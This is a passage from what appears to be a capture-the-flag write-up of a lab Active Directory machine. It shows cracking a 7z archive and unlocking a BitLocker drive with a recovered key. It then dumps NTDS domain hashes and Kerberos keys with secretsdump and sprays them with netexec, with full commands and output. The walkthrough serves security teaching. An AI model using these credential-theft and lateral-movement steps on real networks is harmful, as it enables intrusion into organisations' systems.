alt="image-20240907100217695" class="include_image " /> </picture> <p>There’s HTTP(S) traffic, and then a bunch of connections to TCP 5000 on another host with a private IP, 192.168.1.106.</p> <h4 id="flask-file-hosting">Flask File Hosting</h4> <p>Following the first stream to 192.168.1.106:5000, it’s an HTTP request for a page that calls itself “File Hosting”:</p> <picture> <source type="image/webp" srcset="/img/image-20240907100438268.webp" /> <img loading="lazy" src="/img/image-20240907100438268.png" alt="image-20240907100438268" class="include_image " /> </picture> <p>At the bottom of the page is this footer:</p> <picture> <source type="image/webp" srcset="/img/image-20240907100529090.webp" /> <img loading="lazy" src="/img/image-20240907100529090.png" alt="image-20240907100529090" class="include_image " /> </picture> <p>It’s a match on <a href="https://github.com/bennyscripts/flask-file-hosting">this repo</a>.</p> <p>The next request is a POST to <code class="language-plaintext highlighter-rouge">/login</code>:</p> <picture> <source type="image/webp" srcset="/img/image-20240907100642524.webp" /> <img loading="lazy" src="/img/image-20240907100642524.png" alt="image-20240907100642524" class="include_image " /> </picture> <p>The password is “securepassword”, which matches the default from the repo:</p> <picture> <source type="image/webp" srcset="/img/image-20240907101538873.webp" /> <img loading="lazy" src="/img/image-20240907101538873.png" alt="image-20240907101538873" class="include_image " /> </picture> <p>The login request returns a redirect to <code class="language-plaintext highlighter-rouge">/files</code>.</p> <p>The next stream is a GET for <code class="language-plaintext highlighter-rouge">/files</code>. At the top of the page, there’s an alert about the password being the default:</p> <picture> <source type="image/webp" srcset="/img/image-20240907101402048.webp" /> <img loading="lazy" src="/img/image-20240907101402048.png" alt="image-20240907101402048" class="include_image " /> </picture> <p>There’s also HTML indicating there’s one file uploaded:</p> <picture> <source type="image/webp" srcset="/img/image-20240907100856338.webp" /> <img loading="lazy" src="/img/image-20240907100856338.png" alt="image-20240907100856338" class="include_image " /> </picture> <p>It’s named <code class="language-plaintext highlighter-rouge">BitLocker-backup.7z</code>. A few streams later, there’s a GET to <code class="language-plaintext highlighter-rouge">/view/raw/BitLocker-backup.7z</code>:</p> <picture> <source type="image/webp" srcset="/img/image-20240907101051931.webp" /> <img loading="lazy" src="/img/image-20240907101051931.png" alt="image-20240907101051931" class="include_image " /> </picture> <p>Under File –&gt; Export Objects –&gt; HTTP, the dialog shows packet 107 having the 209 kB file:</p> <picture> <source type="image/webp" srcset="/img/image-20240907101220052.webp" /> <img loading="lazy" src="/img/image-20240907101220052.png" alt="image-20240907101220052" class="include_image " /> </picture> <p>I’ll save it to my host.</p> <p>A few streams later, there’s a POST to <code class="language-plaintext highlighter-rouge">/api/change_auth_token</code>, with a new password set in the headers:</p> <picture> <source type="image/webp" srcset="/img/image-20240907101458994.webp" /> <img loading="lazy" src="/img/image-20240907101458994.png" alt="image-20240907101458994" class="include_image " /> </picture> <h4 id="validate-password-2">Validate Password</h4> <p>That password works for O.Martinez over SMB:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb infiltrator.htb <span class="nt">-u</span> o.martinez <span class="nt">-p</span> <span class="s1">'M@rtinez_P@ssw0rd!'</span> <span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logsuccess">[+]</span><span class="go"> infiltrator.htb\o.martinez:M@rtinez_P@ssw0rd! </span></code></pre></div></div> <p>It does not work over WinRM, but does work over RDP (which matches what BloodHound showed):</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec winrm infiltrator.htb <span class="nt">-u</span> o.martinez <span class="nt">-p</span> <span class="s1">'M@rtinez_P@ssw0rd!'</span> <span class="netexec-protocol">WINRM </span><span class="go"> 10.10.11.31 5985 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:infiltrator.htb) </span><span class="netexec-protocol">WINRM </span><span class="go"> 10.10.11.31 5985 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> infiltrator.htb\o.martinez:M@rtinez_P@ssw0rd! </span><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec rdp infiltrator.htb <span class="nt">-u</span> o.martinez <span class="nt">-p</span> <span class="s1">'M@rtinez_P@ssw0rd!'</span> <span class="netexec-protocol">RDP </span><span class="go"> 10.10.11.31 3389 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:infiltrator.htb) (nla:True) </span><span class="netexec-protocol">RDP </span><span class="go"> 10.10.11.31 3389 DC01 </span><span class="netexec-logsuccess">[+]</span><span class="go"> infiltrator.htb\o.martinez:M@rtinez_P@ssw0rd! </span><span class="netexec-pwned">(Pwn3d!)</span><span class="go"> </span></code></pre></div></div> <h3 id="bitlocker-backup7z">BitLocker-backup.7z</h3> <h4 id="get-access">Get Access</h4> <p>Trying to extract files shows that the archive is password protected:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>7z x BitLocker-backup.7z <span class="go">...[snip]... Enter password (will not be echoed): </span></code></pre></div></div> <p>None of the passwords I have so far work.</p> <p>I’ll create a hash using <code class="language-plaintext highlighter-rouge">7z2john.pl</code> from <a href="https://github.com/openwall/john/blob/bleeding-jumbo/run/7z2john.pl">John</a> (it needs <code class="language-plaintext highlighter-rouge">apt-get install -y libcompress-raw-lzma-perl</code>):</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$ </span>/opt/john/run/7z2john.pl BitLocker-backup.7z | <span class="nb">tee </span>BitLocker-backup.7z.hash <span class="go">ATTENTION: the hashes might contain sensitive encrypted data. Be careful when sharing or posting these hashes BitLocker-backup.7z:$7z$2$19$0$$16$3e870837c60379...[snip]...6fddb8ec64fc2539a$792371$10 </span></code></pre></div></div> <p>The hash is <em>very</em> long, and it starts with the filename and then a <code class="language-plaintext highlighter-rouge">:</code> and then the hash.</p> <p>I’ll pass it to <code class="language-plaintext highlighter-rouge">hashcat</code> with the <code class="language-plaintext highlighter-rouge">--user</code> flag and <code class="language-plaintext highlighter-rouge">rockyou.txt</code>, and it finds the format and cracks it relatively quickly:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$ </span>hashcat BitLocker-backup.7z.hash <span class="nt">--user</span> /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt <span class="go">hashcat (v6.2.6) starting in autodetect mode ...[snip]... Hash-mode was not specified with -m. Attempting to auto-detect hash mode. The following mode was auto-detected as the only one matching your input hash: 11600 | 7-Zip | Archive NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed! Do NOT report auto-detect issues unless you are certain of the hash type. This hash-mode is known to emit multiple valid candidates for the same hash. Use --keep-guessing to continue attack after finding the first crack. ...[snip]... $7z$2$19$0$$16$3e870837c60379...[snip]...:zipper ...[snip]... </span></code></pre></div></div> <p>The password is “zipper”.</p> <h4 id="files">Files</h4> <p>The archive has a directory with a single HTML page:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>7z l BitLocker-backup <span class="go">...[snip]... Date Time Attr Size Compressed Name ------------------- ----- ------------ ------------ ------------------------ 2024-02-19 14:11:00 D.... 0 0 BitLocker-backup 2024-02-20 08:51:45 ....A 792371 209056 BitLocker-backup/Microsoft account _ Clés de récupération BitLocker.html ------------------- ----- ------------ ------------ ------------------------ 2024-02-20 08:51:45 792371 209056 1 files, 1 folders </span></code></pre></div></div> <p>The page is in French, but it’s clear that it’s a BitLocker backup page, including the key:</p> <picture> <source type="image/webp" srcset="/img/image-20240907105039176.webp" /> <img loading="lazy" src="/img/image-20240907105039176.png" alt="image-20240907105039176" class="include_image " /> </picture> <h3 id="rdp">RDP</h3> <h4 id="connect">Connect</h4> <p>I’m able to connect with <code class="language-plaintext highlighter-rouge">xfreerdp /u:INFILTRATOR.HTB\\o.martinez /p:M@rtinez_P@ssw0rd! /v:dc01.infiltrator.htb</code>:</p> <picture> <source type="image/webp" srcset="/img/image-20240907102430498.webp" /> <img loading="lazy" src="/img/image-20240907102430498.png" alt="image-20240907102430498" class="include_image " /> </picture> <p>Output is running, as is the window from my <code class="language-plaintext highlighter-rouge">rev.bat</code> that provided a shell. Shortly after logging in, a popup shows that my session is limited:</p> <picture> <source type="image/webp" srcset="/img/image-20240907102811508.webp" /> <img loading="lazy" src="/img/image-20240907102811508.png" alt="image-20240907102811508" class="include_image " /> </picture> <h4 id="access-e">Access E:</h4> <p>Opening Explorer, there’s an <code class="language-plaintext highlighter-rouge">E:</code> that’s locked:</p> <picture> <source type="image/webp" srcset="/img/image-20240907102827676.webp" /> <img loading="lazy" src="/img/image-20240907102827676.png" alt="image-20240907102827676" class="include_image " /> </picture> <p>Double-clicking it pops a Bitlocker prompt:</p> <picture> <source type="image/webp" srcset="/img/image-20240907102900120.webp" /> <img loading="lazy" src="/img/image-20240907102900120.png" alt="image-20240907102900120" class="include_image " /> </picture> <p>I’ll click “More options”:</p> <picture> <source type="image/webp" srcset="/img/image-20240907105149400.webp" /> <img loading="lazy" src="/img/image-20240907105149400.png" alt="image-20240907105149400" class="include_image " /> </picture> <p>“Enter recovery key” offers a field for the key:</p> <picture> <source type="image/webp" srcset="/img/image-20240907105215257.webp" /> <img loading="lazy" src="/img/image-20240907105215257.png" alt="image-20240907105215257" class="include_image " /> </picture> <p>Entering the key from the backup works:</p> <picture> <source type="image/webp" srcset="/img/image-20240907105242017.webp" /> <img loading="lazy" src="/img/image-20240907105242017.png" alt="image-20240907105242017" class="include_image " /> </picture> <p>The lock is now open.</p> <h4 id="exfil">Exfil</h4> <p>The <code class="language-plaintext highlighter-rouge">E:</code> drive has a single folder:</p> <picture> <source type="image/webp" srcset="/img/image-20240907105942646.webp" /> <img loading="lazy" src="/img/image-20240907105942646.png" alt="image-20240907105942646" class="include_image " /> </picture> <p>Because my time is limited, I’ll open a command terminal and compress it all:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">E:\&gt;</span>powershell <span class="go">Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. </span><span class="gp">PS E:\&gt;</span><span class="w"> </span>Compress-Archive <span class="nt">-Path</span> <span class="s1">'E:\Windows Server 2012 R2 - Backups\'</span> <span class="nt">-DestinationPath</span> C:<span class="se">\P</span>rogramData<span class="se">\E</span>drive.zip </code></pre></div></div> <p>From an Evil-WinRM session, I’ll download that archive.</p> <h4 id="recover-backup">Recover Backup</h4> <p>Looking at the archive, one file jumps out immediately:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>unzip <span class="nt">-l</span> Edrive.zip <span class="go">Archive: Edrive.zip Length Date Time Name --------- ---------- ----- ---- 0 2024-09-07 08:08 Windows Server 2012 R2 - Backups\Files\ 0 2024-09-07 08:08 Windows Server 2012 R2 - Backups\PerfLogs\ 0 2024-09-07 08:08 Windows Server 2012 R2 - Backups\Program\ 0 2024-09-07 08:08 Windows Server 2012 R2 - Backups\Program Files (x86)\ 0 2024-09-07 08:08 Windows Server 2012 R2 - Backups\Users\ 0 2024-09-07 08:08 Windows Server 2012 R2 - Backups\Windows\ 2055137 2024-02-25 06:23 Windows Server 2012 R2 - Backups\Users\Administrator\Documents\Backup_Credentials.7z 208 2024-02-24 20:47 Windows Server 2012 R2 - Backups\Users\Administrator\Favorites\Bing.url 461 2024-02-24 20:47 Windows Server 2012 R2 - Backups\Users\Administrator\Links\Desktop.lnk 906 2024-02-24 20:47 Windows Server 2012 R2 - Backups\Users\Administrator\Links\Downloads.lnk 363 2024-02-24 20:47 Windows Server 2012 R2 - Backups\Users\Administrator\Links\RecentPlaces.lnk 208 2024-02-24 20:47 Windows Server 2012 R2 - Backups\Users\m.harris\Favorites\Bing.url 461 2024-02-24 20:47 Windows Server 2012 R2 - Backups\Users\m.harris\Links\Desktop.lnk 906 2024-02-24 20:47 Windows Server 2012 R2 - Backups\Users\m.harris\Links\Downloads.lnk 363 2024-02-24 20:47 Windows Server 2012 R2 - Backups\Users\m.harris\Links\RecentPlaces.lnk 208 2024-02-24 20:47 Windows Server 2012 R2 - Backups\Users\o.martinez\Favorites\Bing.url 461 2024-02-24 20:47 Windows Server 2012 R2 - Backups\Users\o.martinez\Links\Desktop.lnk 906 2024-02-24 20:47 Windows Server 2012 R2 - Backups\Users\o.martinez\Links\Downloads.lnk 363 2024-02-24 20:47 Windows Server 2012 R2 - Backups\Users\o.martinez\Links\RecentPlaces.lnk 208 2024-02-24 20:47 Windows Server 2012 R2 - Backups\Users\winrm_svc\Favorites\Bing.url 461 2024-02-24 20:47 Windows Server 2012 R2 - Backups\Users\winrm_svc\Links\Desktop.lnk 906 2024-02-24 20:47 Windows Server 2012 R2 - Backups\Users\winrm_svc\Links\Downloads.lnk 363 2024-02-24 20:47 Windows Server 2012 R2 - Backups\Users\winrm_svc\Links\RecentPlaces.lnk --------- ------- 2062889 23 files </span></code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">Backup_Credentials.7z</code> contains the information that stores the hashes for the domain:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>7z l Windows<span class="se">\ </span>Server<span class="se">\ </span>2012<span class="se">\ </span>R2<span class="se">\ </span>-<span class="se">\ </span>Backups/Users/Administrator/Documents/Backup_Credentials.7z <span class="go">...[snip]... Date Time Attr Size Compressed Name ------------------- ----- ------------ ------------ ------------------------ 2024-02-25 10:12:32 D.... 0 0 Active Directory 2024-02-25 10:12:34 D.... 0 0 registry 2024-02-25 10:12:34 ....A 35667968 2054887 Active Directory/ntds.dit 2024-02-25 10:00:07 ....A 262144 registry/SECURITY 2024-02-25 10:00:07 ....A 12582912 registry/SYSTEM ------------------- ----- ------------ ------------ ------------------------ 2024-02-25 10:12:34 48513024 2054887 3 files, 2 folders </span></code></pre></div></div> <p>It isn’t password protected.</p> <h3 id="backup-hashes">Backup Hashes</h3> <h4 id="dump-hashes">Dump Hashes</h4> <p>The obvious thing to try here is dumping hashes from the NTDS file using <code class="language-plaintext highlighter-rouge">secretsdump</code>:</p> <div class="language-console code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$ </span>secretsdump.py <span class="nt">-security</span> registry/SECURITY <span class="nt">-system</span> registry/SYSTEM <span class="nt">-ntds</span> Active<span class="se">\ </span>Directory/ntds.dit LOCAL <span class="go">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Target system bootKey: 0xd7e7d8797c1ccd58d95e4fb25cb7bdd4 [*] Dumping cached domain logon information (domain/username:hash) [*] Dumping LSA Secrets [*] $MACHINE.ACC $MACHINE.ACC:plain_password_hex:4b90048ad6028aae98f66484009266d4efa571d48a8aa6b771d69d20aba16ddb7e0a0ffe9378a1ac7b31a812f0760fe2a8ce66ff6a0ff772155a29baa59b4407a95a920d0904cba6f8b19b6393f1551a476f991bbedaa66880e60611482a81b31b34c55c77d0e0d1792e3b18cdc9d39e0b776e7ef082399b096aaa2e8d93eb1f0340fd5f6e138da2580d1f581ff9426dce99a901a1bf88ad3f19a5bc4ce8ff17fdbb0a04bb29f13dc46177a6d8cd61bf91f8342e33b5362daecbb888df22ce467aa9f45a9dc69b03d116eeac89857d17f3f44f4abc34165b296a42b3b3ff5ab26401b5734fab6ad142d7882715927e45 $MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:fe4767309896203c581b9fc3c5e23b00 [*] DefaultPassword (Unknown User):ROOT#123 [*] DPAPI_SYSTEM dpapi_machinekey:0x81f5247051ff9535ad8299f0efd531ff3a5cb688 dpapi_userkey:0x79d13d91a01f6c38437c526396febaf8c1bc6909 [*] NL$KM 0000 2E 8A EC D8 ED 12 C6 ED 26 8E B0 9B DF DA 42 B7 ........&amp;.....B. 0010 49 DA B0 07 05 EE EA 07 05 02 04 0E AD F7 13 C2 I............... 0020 6C 6D 8E 19 1A B0 51 41 7C 7D 73 9E 99 BA CD B1 lm....QA|}s..... 0030 B7 7A 3E 0F 59 50 1C AD 8F 14 62 84 3F AC A9 92 .z&gt;.YP....b.?... NL$KM:2e8aecd8ed12c6ed268eb09bdfda42b749dab00705eeea070502040eadf713c26c6d8e191ab051417c7d739e99bacdb1b77a3e0f59501cad8f1462843faca992 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash) [*] Searching for pekList, be patient [*] PEK # 0 found and decrypted: d27644ab3070f72ec264fcb413d75299 [*] Reading and decrypting hashes from Active Directory/ntds.dit Administrator:500:aad3b435b51404eeaad3b435b51404ee:7bf62b9c45112ffdadb7b6b4b9299dd2::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DC$:1001:aad3b435b51404eeaad3b435b51404ee:fe4767309896203c581b9fc3c5e23b00::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:454fcbc37690c6e4628ab649e8e285a5::: infiltrator.htb\winrm_svc:1104:aad3b435b51404eeaad3b435b51404ee:84287cd16341b91eb93a58456b73e30f::: infiltrator.htb\lan_managment:1105:aad3b435b51404eeaad3b435b51404ee:e8ade553d9b0cb1769f429d897c92931::: infiltrator.htb\M.harris:1106:aad3b435b51404eeaad3b435b51404ee:fc236589c448c620417b15597a3d3ca7::: infiltrator.htb\D.anderson:1107:aad3b435b51404eeaad3b435b51404ee:627a2cb0adc7ba12ea11174941b3da88::: infiltrator.htb\L.clark:1108:aad3b435b51404eeaad3b435b51404ee:627a2cb0adc7ba12ea11174941b3da88::: infiltrator.htb\O.martinez:1109:aad3b435b51404eeaad3b435b51404ee:eb86d7bcb30c8eac1bdcae5061e2dff4::: infiltrator.htb\A.walker:1110:aad3b435b51404eeaad3b435b51404ee:46389d8dfdfcf0cbe262a71f576e574b::: infiltrator.htb\K.turner:1111:aad3b435b51404eeaad3b435b51404ee:48bcd1cdc870c6285376a990c2604531::: infiltrator.htb\E.rodriguez:1112:aad3b435b51404eeaad3b435b51404ee:b1918c2ce6a62f4eee11c51b6e2e965a::: [*] Kerberos keys from Active Directory/ntds.dit DC$:aes256-cts-hmac-sha1-96:09b3e08f549e92e0b16ed45f84b25cc6d0c147ff169ce059811a3ed9e6957176 DC$:aes128-cts-hmac-sha1-96:d2a3d7c9ee6965b1e3cd710ed1ceed0f DC$:des-cbc-md5:5eea34b3317aea91 krbtgt:aes256-cts-hmac-sha1-96:f6e0a1bd3a180f83472cd2666b28de969442b7745545afb84bbeaa9397cb9b87 krbtgt:aes128-cts-hmac-sha1-96:7874dff8138091d6c344381c9c758540 krbtgt:des-cbc-md5:10bfc49ecd3b58d9 infiltrator.htb\winrm_svc:aes256-cts-hmac-sha1-96:ae473ae7da59719ebeec93c93704636abb7ee7ff69678fdec129afe2fc1592c4 infiltrator.htb\winrm_svc:aes128-cts-hmac-sha1-96:0faf5e0205d6f43ae37020f79f60606a infiltrator.htb\winrm_svc:des-cbc-md5:7aba231386c2ecf8 infiltrator.htb\lan_managment:aes256-cts-hmac-sha1-96:6fcd2f66179b6b852bb3cc30f2ba353327924081c47d09bc5a9fafc623016e96 infiltrator.htb\lan_managment:aes128-cts-hmac-sha1-96:48f45b8eb2cbd8dbf578241ee369ddd9 infiltrator.htb\lan_managment:des-cbc-md5:31c83197ab944052 infiltrator.htb\M.harris:aes256-cts-hmac-sha1-96:20433af8bf6734568f112129c951ad87f750dddf092648c80816d5cb42ed0f49 infiltrator.htb\M.harris:aes128-cts-hmac-sha1-96:2ee0cd05c3fa205a92e6837ff212b7a0 infiltrator.htb\M.harris:des-cbc-md5:3ee3688376f2e5ce infiltrator.htb\D.anderson:aes256-cts-hmac-sha1-96:42447533e9f1c9871ddd2137def662980e677a748b5d184da910d3c4daeb403f infiltrator.htb\D.anderson:aes128-cts-hmac-sha1-96:021e189e743a78a991616821138e2e69 infiltrator.htb\D.anderson:des-cbc-md5:1529a829132a2345 infiltrator.htb\L.clark:aes256-cts-hmac-sha1-96:dddc0366b026b09ebf0ac3e7a7f190b491c4ee0d7976a4c3b324445485bf1bfc infiltrator.htb\L.clark:aes128-cts-hmac-sha1-96:5041c75e19de802e0f7614f57edc8983 infiltrator.htb\L.clark:des-cbc-md5:cd023d5d70e6aefd infiltrator.htb\O.martinez:aes256-cts-hmac-sha1-96:4d2d8951c7d6eba4edaf172fd0f7b78ab7260e3d513bf2ff387c70c85d912a2f infiltrator.htb\O.martinez:aes128-cts-hmac-sha1-96:33fdf738e13878a8101e3bf929a5a120 infiltrator.htb\O.martinez:des-cbc-md5:f80bc202755d2cfd infiltrator.htb\A.walker:aes256-cts-hmac-sha1-96:e26c97600c6f44990f18480087a685e0f1c71bcfbc8413dce6764ccf77df448a infiltrator.htb\A.walker:aes128-cts-hmac-sha1-96:768672b783131ed963b9deeac0a6d2e4 infiltrator.htb\A.walker:des-cbc-md5:a7e6cde06d6e153b infiltrator.htb\K.turner:aes256-cts-hmac-sha1-96:2c816a32b395f67df520bc734f7ea8e4df64a9610ffb3ef43e0e9df69b9df8b8 infiltrator.htb\K.turner:aes128-cts-hmac-sha1-96:b20f41c0d3b8fb6e1b793af4a835109b infiltrator.htb\K.turner:des-cbc-md5:4607b9eaec6838ba infiltrator.htb\E.rodriguez:aes256-cts-hmac-sha1-96:9114030dd2a57970530eda4ce0aa6b14f88f2be44f6d920de31eb6ee6f1587b5 infiltrator.htb\E.rodriguez:aes128-cts-hmac-sha1-96:ddd37cf706781414885f561c3b469d0c infiltrator.htb\E.rodriguez:des-cbc-md5:9d5bdaf2cd26165d [*] Cleaning up... </span></code></pre></div></div> <p>I’ll grab the NTLMs into a file, and use it to create a users file and a hashes file:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cat </span>ntlms.txt | <span class="nb">cut</span> <span class="nt">-d</span>: <span class="nt">-f1</span> <span class="o">&gt;</span> <span class="nb">users</span> <span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cat </span>ntlms.txt | <span class="nb">cut</span> <span class="nt">-d</span>: <span class="nt">-f3-4</span> <span class="o">&gt;</span> hashes </code></pre></div></div> <p>I’ll try these with <code class="language-plaintext highlighter-rouge">netexec</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$ </span>netexec smb infiltrator.htb <span class="nt">-u</span> <span class="nb">users</span> <span class="nt">-H</span> hashes <span class="nt">--no-bruteforce</span> <span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> infiltrator.htb\Administrator:7bf62b9c45112ffdadb7b6b4b9299dd2 STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logpurplefail">[-]</span><span class="go"> infiltrator.htb\Guest:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_ACCOUNT_DISABLED </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> infiltrator.htb\DC$:fe4767309896203c581b9fc3c5e23b00 STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> infiltrator.htb\krbtgt:454fcbc37690c6e4628ab649e8e285a5 STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> infiltrator.htb\winrm_svc:84287cd16341b91eb93a58456b73e30f STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> infiltrator.htb\lan_managment:e8ade553d9b0cb1769f429d897c92931 STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logpurplefail">[-]</span><span class="go"> infiltrator.htb\M.harris:fc236589c448c620417b15597a3d3ca7 STATUS_ACCOUNT_RESTRICTION </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logpurplefail">[-]</span><span class="go"> infiltrator.htb\D.anderson:627a2cb0adc7ba12ea11174941b3da88 STATUS_ACCOUNT_RESTRICTION </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logsuccess">[+]</span><span class="go"> infiltrator.htb\L.clark:627a2cb0adc7ba12ea11174941b3da88 </span></code></pre></div></div> <p>L.Clark works, but I know their password. M.Harris and D.Anderson are disabled, but I’ve already compromised both of them as well.</p> <h4 id="ntds-enumeration">NTDS Enumeration</h4> <p>The NTDS file contains more than just the hashes. <a href="https://github.com/almandin/ntdsdotsqlite">NTDS.Sqlite</a> is a neat tool to take all the information from the <code class="language-plaintext highlighter-rouge">ntds.dit</code> file and convert it to a SQLite DB for enumeration. It installs with <code class="language-plaintext highlighter-rouge">pipx install ntdsdotsqlite</code>. Then it takes the <code class="language-plaintext highlighter-rouge">ntds.dit</code> file and the <code class="language-plaintext highlighter-rouge">SYSTEM</code> hive:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ntdsdotsqlite Active<span class="se">\ </span>Directory/ntds.dit <span class="nt">--system</span> registry/SYSTEM <span class="nt">-o</span> ntds.sqlite <span class="go">100%|██████████████████████████████████| 3823/3823 [00:00&lt;00:00, 13651.90it/s] </span></code></pre></div></div> <p>The resulting DB file has eight tables:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="n">sqlite3</span> <span class="n">ntds</span><span class="p">.</span><span class="n">sqlite</span> <span class="go">SQLite version 3.45.1 2024-01-30 16:01:20 Enter ".help" for usage hints. </span><span class="gp">sqlite&gt;</span><span class="w"> </span><span class="p">.</span><span class="n">tables</span> <span class="go">containers groups trusted_domains domain_dns machine_accounts user_accounts domains organizational_units </span></code></pre></div></div> <p>In the <code class="language-plaintext highlighter-rouge">user_accounts</code> table, there’s the same kind of information I typically see in LDAP. The lan_managment account has an interesting description (and a misspelled name):</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sqlite&gt; </span><span class="k">select</span> <span class="n">commonname</span><span class="p">,</span><span class="n">description</span> <span class="k">from</span> <span class="n">user_accounts</span> <span class="p">;</span> <span class="go">Administrator|Built-in account for administering the computer/domain Guest|Built-in account for guest access to the computer/domain krbtgt|Key Distribution Center Service Account winrm_svc|User Security and Management Specialist lan_managment|l@n_M@an!1331 M.harris|Head of Development Department D.anderson| L.clark| O.martinez| A.walker| K.turner| E.rodriguez| </span></code></pre></div></div> <h4 id="validate-creds">Validate Creds</h4> <p>The creds work for lan_managment for SMB and RDP, but not WinRM:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb infiltrator.htb <span class="nt">-u</span> lan_managment <span class="nt">-p</span> <span class="s1">'l@n_M@an!1331'</span> <span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logsuccess">[+]</span><span class="go"> infiltrator.htb\lan_managment:l@n_M@an!1331 </span><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec winrm infiltrator.htb <span class="nt">-u</span> lan_managment <span class="nt">-p</span> <span class="s1">'l@n_M@an!1331'</span> <span class="netexec-protocol">WINRM </span><span class="go"> 10.10.11.31 5985 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:infiltrator.htb) </span><span class="netexec-protocol">WINRM </span><span class="go"> 10.10.11.31 5985 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> infiltrator.htb\lan_managment:l@n_M@an!1331 </span><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec rdp infiltrator.htb <span class="nt">-u</span> lan_managment <span class="nt">-p</span> <span class="s1">'l@n_M@an!1331'</span> <span class="netexec-protocol">RDP </span><span class="go"> 10.10.11.31 3389 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:infiltrator.htb) (nla:True) </span><span class="netexec-protocol">RDP </span><span class="go"> 10.10.11.31 3389 DC01 </span><span 